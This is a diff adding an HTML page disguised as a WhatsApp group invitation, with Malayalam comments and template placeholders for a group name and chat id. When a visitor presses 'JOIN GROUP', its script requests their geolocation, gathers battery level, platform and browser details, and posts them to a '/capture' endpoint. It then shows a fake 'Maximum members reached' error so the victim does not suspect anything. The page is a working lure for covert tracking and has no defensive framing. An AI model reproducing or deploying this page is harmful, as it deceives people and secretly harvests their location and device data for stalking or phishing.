@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ml">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Group Invite</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #d1d7db; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; width: 90%; max-width: 400px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; padding: 20px; }
+        .group-img { width: 100px; height: 100px; border-radius: 50%; background: #eee; margin-top: -50px; border: 5px solid white; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        h2 { color: #111b21; margin: 15px 0 5px; }
+        p { color: #667781; font-size: 14px; }
+        .btn { background-color: #00a884; color: white; border: none; padding: 12px 25px; border-radius: 25px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; font-size: 16px; }
+        .btn:hover { background-color: #008f72; }
+        .error-msg { color: #ea0038; font-size: 13px; margin-top: 15px; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="group-img" alt="Group Icon">
+    <h2 id="group-name">{{ group_name }}</h2>
+    <p>WhatsApp Group Invitation</p>
+    <hr style="border: 0.5px solid #eee; margin: 20px 0;">
+    
+    <button class="btn" onclick="collectData()">JOIN GROUP</button>
+    <div id="error" class="error-msg">Maximum members reached! (1024/1024)</div>
+</div>
+
+<script>
+    async function collectData() {
+        // ലൊക്കേഷൻ പെർമിഷൻ ചോദിക്കുന്നു
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendData, handleError);
+        } else {
+            sendData(); // ലൊക്കേഷൻ ഇല്ലെങ്കിലും ബാക്കി വിവരങ്ങൾ അയക്കാൻ
+        }
+    }
+
+    async function sendData(position = null) {
+        let battery = await navigator.getBattery();
+        let data = {
+            chat_id: "{{ chat_id }}",
+            lat: position ? position.coords.latitude : "Denied",
+            lon: position ? position.coords.longitude : "Denied",
+            battery: (battery.level * 100) + "%",
+            platform: navigator.platform,
+            browser: navigator.userAgent
+        };
+
+        // സെർവറിലേക്ക് വിവരങ്ങൾ അയക്കുന്നു
+        fetch('/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+
+        // "Maximum members" മെസേജ് കാണിക്കുന്നു
+        document.getElementById('error').style.display = 'block';
+    }
+
+    function handleError() { sendData(); }
+</script>
+
+</body>
+</html>
